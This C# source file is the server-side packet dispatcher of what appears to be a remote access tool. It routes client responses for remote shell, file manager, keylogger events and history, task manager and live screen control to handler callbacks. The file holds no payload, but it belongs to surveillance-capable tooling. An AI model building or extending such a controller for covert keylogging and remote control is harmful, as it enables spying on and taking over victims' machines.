using System;
using Common.Enums;
using Common.Networking;
using Common.Utils;

namespace Server.Networking
{
    public sealed class PacketHandler
    {
        private readonly Action<SystemInfoResponse> _onSystemInfoResponse;
        private readonly Action<RemoteShellResponse> _onRemoteShellResponse;
        private readonly Action<FileManagerResponse> _onFileManagerResponse;
        private readonly Action<KeyLoggerEvent>? _onKeyLoggerEvent;
        private readonly Action<KeyLoggerBatch>? _onKeyLoggerBatch;
        private readonly Action<KeyLoggerComboEvent>? _onKeyLoggerComboEvent;
        private readonly Action<KeyLoggerHistoryResponse>? _onKeyLoggerHistoryResponse;
        private readonly Action<MessageBoxResponse> _onMessageBoxResponse;
        private readonly Action<ShutdownActionResponse> _onShutdownActionResponse;
        private readonly Action<TaskManagerResponse> _onTaskManagerResponse;
        private readonly Action<ScreenControlResponse>? _onScreenControlResponse;
        private readonly Action<ScreenControlFrame>? _onScreenControlFrame;

        public PacketHandler(Action<SystemInfoResponse> onSystemInfoResponse, 
                             Action<RemoteShellResponse> onRemoteShellResponse, 
                             Action<FileManagerResponse> onFileManagerResponse, 
                             Action<MessageBoxResponse> onMessageBoxResponse, 
                             Action<ShutdownActionResponse> onShutdownActionResponse,
							 Action<TaskManagerResponse> onTaskManagerResponse,
							 Action<KeyLoggerEvent>? onKeyLoggerEvent = null, 
                             Action<KeyLoggerBatch>? onKeyLoggerBatch = null, 
                             Action<KeyLoggerComboEvent>? onKeyLoggerComboEvent = null,
                             Action<KeyLoggerHistoryResponse>? onKeyLoggerHistoryResponse = null,
                             Action<ScreenControlResponse>? onScreenControlResponse = null,
                             Action<ScreenControlFrame>? onScreenControlFrame = null)
        {
            _onSystemInfoResponse = onSystemInfoResponse;
            _onRemoteShellResponse = onRemoteShellResponse;
            _onFileManagerResponse = onFileManagerResponse;
            _onKeyLoggerEvent = onKeyLoggerEvent;
            _onKeyLoggerBatch = onKeyLoggerBatch;
            _onKeyLoggerComboEvent = onKeyLoggerComboEvent;
            _onKeyLoggerHistoryResponse = onKeyLoggerHistoryResponse;
            _onMessageBoxResponse = onMessageBoxResponse;
            _onShutdownActionResponse = onShutdownActionResponse;
            _onTaskManagerResponse = onTaskManagerResponse;
            _onScreenControlResponse = onScreenControlResponse;
            _onScreenControlFrame = onScreenControlFrame;
        }

        public void HandleLine(string json)
        {
            try
            {
                var baseObj = JsonHelper.Deserialize<BasePacket>(json);
                if (baseObj == null) return;
                switch (baseObj.PacketType)
                {
                    case PacketType.SystemInfoResponse:
                        var resp = JsonHelper.Deserialize<SystemInfoResponse>(json);
                        if (resp != null)
                        {
                            _onSystemInfoResponse(resp);
                        }
                        break;

                    case PacketType.RemoteShellResponse:
                        var shellResp = JsonHelper.Deserialize<RemoteShellResponse>(json);
                        if (shellResp != null)
                        {
                            _onRemoteShellResponse(shellResp);
                        }
                        break;

                    case PacketType.FileManagerResponse:
                        var fileResp = JsonHelper.Deserialize<FileManagerResponse>(json);
                        if (fileResp != null)
                        {
                            _onFileManagerResponse(fileResp);
                        }
                        break;

                    case PacketType.KeyLoggerEvent:
                        var klEvt = JsonHelper.Deserialize<KeyLoggerEvent>(json);
                        if (klEvt != null && _onKeyLoggerEvent != null) _onKeyLoggerEvent(klEvt);
                        break;

                    case PacketType.KeyLoggerBatch:
                        var klBatch = JsonHelper.Deserialize<KeyLoggerBatch>(json);
                        if (klBatch != null && _onKeyLoggerBatch != null) _onKeyLoggerBatch(klBatch);
                        break;

                    case PacketType.KeyLoggerComboEvent:
                        var klCombo = JsonHelper.Deserialize<KeyLoggerComboEvent>(json);
                        if (klCombo != null && _onKeyLoggerComboEvent != null) _onKeyLoggerComboEvent(klCombo);
                        break;
                    case PacketType.KeyLoggerHistoryResponse:
                        var klHistory = JsonHelper.Deserialize<KeyLoggerHistoryResponse>(json);
                        if (klHistory != null && _onKeyLoggerHistoryResponse != null) _onKeyLoggerHistoryResponse(klHistory);
                        break;
                    case PacketType.MessageBoxResponse:
                        var msgResq = JsonHelper.Deserialize<MessageBoxResponse>(json);
                        if (msgResq != null)
                        {
                            _onMessageBoxResponse(msgResq);
                        }
                        break;
                    case PacketType.ShutdownActionResponse:
                        var sdResq = JsonHelper.Deserialize<ShutdownActionResponse>(json);
                        if (sdResq != null)
                        {
                            _onShutdownActionResponse(sdResq);
                        }
                        break;
                    
                    case PacketType.TaskManagerResponse:
						            var taskResp = JsonHelper.Deserialize<TaskManagerResponse>(json);
						            if (taskResp != null)
						            {
							              _onTaskManagerResponse(taskResp);
						            }
						        break;
                    
                    case PacketType.ScreenControlResponse:
                        var screenResp = JsonHelper.Deserialize<ScreenControlResponse>(json);
                        if (screenResp != null && _onScreenControlResponse != null)
                        {
                            _onScreenControlResponse(screenResp);
                        }
                        break;
                    
                    case PacketType.ScreenControlFrame:
                        var screenFrame = JsonHelper.Deserialize<ScreenControlFrame>(json);
                        if (screenFrame != null && _onScreenControlFrame != null)
                        {
                            _onScreenControlFrame(screenFrame);
                        }
                        break;
                    
                    default:
                        break;
                }
            }
            catch (Exception)
            {
                // swallow or log
            }
        }
    }
}


